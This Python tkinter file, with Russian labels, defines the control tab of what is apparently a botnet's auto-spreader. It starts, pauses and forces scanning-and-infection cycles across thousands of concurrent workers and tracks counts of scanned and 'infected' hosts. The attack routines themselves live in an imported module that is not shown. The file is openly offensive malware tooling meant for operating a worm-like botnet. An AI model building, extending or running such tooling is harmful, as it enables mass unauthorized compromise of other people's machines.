import tkinter as tk
from tkinter import ttk
import asyncio
import threading
import time
from utils.logger import log
from botnet.auto_spreader import AutoSpreader
from utils.widgets import add_copy_paste_support

class BotAutoTab(ttk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent)
        self.app = app
        self.spreader = None
        self.loop = None
        self.thread = None
        self.running = False
        self.paused_flag = False
        self.create_widgets()
        add_copy_paste_support(self)

    def create_widgets(self):
        # Рамка настроек
        settings_frame = ttk.LabelFrame(self, text="Настройки автозахвата")
        settings_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(settings_frame, text="Интервал (сек):").grid(row=0, column=0, padx=5, pady=5)
        self.interval_var = tk.IntVar(value=30)
        ttk.Spinbox(settings_frame, from_=5, to=300, textvariable=self.interval_var, width=10).grid(row=0, column=1, padx=5)

        ttk.Label(settings_frame, text="Потоков:").grid(row=0, column=2, padx=5)
        self.workers_var = tk.IntVar(value=3000)
        ttk.Spinbox(settings_frame, from_=100, to=10000, textvariable=self.workers_var, width=10).grid(row=0, column=3, padx=5)

        ttk.Button(settings_frame, text="Применить настройки", command=self.apply_settings).grid(row=0, column=4, padx=10)

        # Кнопки управления
        control_frame = ttk.Frame(self)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        self.start_btn = ttk.Button(control_frame, text="Запустить", command=self.start_spreader)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        self.stop_btn = ttk.Button(control_frame, text="Остановить", command=self.stop_spreader, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        self.pause_btn = ttk.Button(control_frame, text="Пауза", command=self.pause_spreader, state=tk.DISABLED)
        self.pause_btn.pack(side=tk.LEFT, padx=5)
        self.force_btn = ttk.Button(control_frame, text="Принудительный цикл", command=self.force_cycle)
        self.force_btn.pack(side=tk.LEFT, padx=5)

        # Индикаторы
        stats_frame = ttk.LabelFrame(self, text="Статистика")
        stats_frame.pack(fill=tk.X, padx=5, pady=5)
        self.scanned_label = ttk.Label(stats_frame, text="Просканировано: 0")
        self.scanned_label.pack(side=tk.LEFT, padx=10)
        self.infected_label = ttk.Label(stats_frame, text="Заражено: 0")
        self.infected_label.pack(side=tk.LEFT, padx=10)
        self.progress = ttk.Progressbar(stats_frame, mode='indeterminate')
        self.progress.pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)

        # Лог
        log_frame = ttk.LabelFrame(self, text="Лог автозахвата")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text = tk.Text(log_frame, height=15, wrap=tk.WORD)
        scroll = ttk.Scrollbar(log_frame, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scroll.set)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)

    def apply_settings(self):
        if self.spreader:
            self.spreader.interval = self.interval_var.get()
            self.spreader.max_workers = self.workers_var.get()
        self.log("Настройки применены")

    def start_spreader(self):
        if self.running:
            return
        self.running = True
        self.paused_flag = False
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.pause_btn.config(state=tk.NORMAL)
        self.progress.start(10)
        self.spreader = AutoSpreader()
        self.spreader.interval = self.interval_var.get()
        self.spreader.max_workers = self.workers_var.get()
        self.loop = asyncio.new_event_loop()
        def run_loop():
            asyncio.set_event_loop(self.loop)
            self.loop.run_forever()
        self.thread = threading.Thread(target=run_loop, daemon=True)
        self.thread.start()
        asyncio.run_coroutine_threadsafe(self.spreader.start(), self.loop)
        self.log("Автозахват запущен")

    def stop_spreader(self):
        if not self.running:
            return
        self.running = False
        self.paused_flag = False
        if self.spreader:
            # Останавливаем все задачи корректно
            async def stop():
                self.spreader.stop()
                # Отменяем все активные таски в цикле
                tasks = [t for t in asyncio.all_tasks(self.loop) if t is not asyncio.current_task()]
                for t in tasks:
                    t.cancel()
                await asyncio.gather(*tasks, return_exceptions=True)
                self.loop.stop()
            asyncio.run_coroutine_threadsafe(stop(), self.loop)
        self.thread.join(timeout=2)
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.pause_btn.config(state=tk.DISABLED)
        self.progress.stop()
        # Автосохранение лога
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"auto_log_{timestamp}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(self.log_text.get(1.0, tk.END))
        self.log(f"Лог сохранён в {filename}")
        self.log("Автозахват остановлен")

    def pause_spreader(self):
        if not self.running or self.paused_flag:
            return
        self.paused_flag = True
        if self.spreader:
            async def pause():
                self.spreader.pause()
                # Отменяем все сканирующие таски, но оставляем основной цикл
                for task in asyncio.all_tasks(self.loop):
                    if "scan_ports_async" in str(task) or "attack_target" in str(task):
                        task.cancel()
            asyncio.run_coroutine_threadsafe(pause(), self.loop)
        self.pause_btn.config(text="Продолжить", command=self.resume_spreader)
        self.log("Пауза активирована (все активные сканирования отменены)")

    def resume_spreader(self):
        if not self.running or not self.paused_flag:
            return
        self.paused_flag = False
        if self.spreader:
            async def resume():
                self.spreader.resume()
            asyncio.run_coroutine_threadsafe(resume(), self.loop)
        self.pause_btn.config(text="Пауза", command=self.pause_spreader)
        self.log("Работа продолжена")

    def force_cycle(self):
        if not self.running or self.paused_flag:
            self.log("Автозахват не активен или на паузе")
            return
        async def force():
            await self.spreader.scan_once([])  # вызовет один цикл
        asyncio.run_coroutine_threadsafe(force(), self.loop)
        self.log("Принудительный цикл запущен")

    def log(self, msg):
        self.log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.log_text.see(tk.END)
        log(msg, "INFO")

    def update_stats(self):
        if self.spreader:
            self.scanned_label.config(text=f"Просканировано: {self.spreader.stats.get('scanned',0)}")
            self.infected_label.config(text=f"Заражено: {self.spreader.stats.get('infected',0)}")
        self.after(500, self.update_stats)